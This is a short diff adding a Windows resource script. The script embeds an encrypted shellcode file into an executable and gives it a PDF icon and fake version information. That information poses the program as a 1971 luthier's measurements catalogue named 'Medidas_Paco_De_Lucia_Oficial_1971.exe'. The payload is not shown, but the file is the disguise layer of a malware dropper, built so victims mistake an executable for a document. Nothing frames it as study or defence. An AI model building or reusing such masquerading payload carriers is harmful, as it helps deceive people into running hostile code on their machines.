@@ -1,0 +1,24 @@
+SHELL RCDATA "shellcode.enc"
+1 ICON "pdf.ico"
+
+1 VERSIONINFO
+FILEVERSION     1,0,0,0
+PRODUCTVERSION  1,0,0,0
+BEGIN
+  BLOCK "StringFileInfo"
+  BEGIN
+    BLOCK "040904B0"
+    BEGIN
+      VALUE "CompanyName",      "Ediciones Luthieria"
+      VALUE "FileDescription",  "Catalogo de Medidas - Luthieria 1971"
+      VALUE "FileVersion",      "1.0.0.0"
+      VALUE "ProductName",      "Catalogo Luthieria"
+      VALUE "OriginalFilename", "Medidas_Paco_De_Lucia_Oficial_1971.exe"
+      VALUE "LegalCopyright",   "(c) 1971"
+    END
+  END
+  BLOCK "VarFileInfo"
+  BEGIN
+    VALUE "Translation", 0x409, 0x04B0
+  END
+END
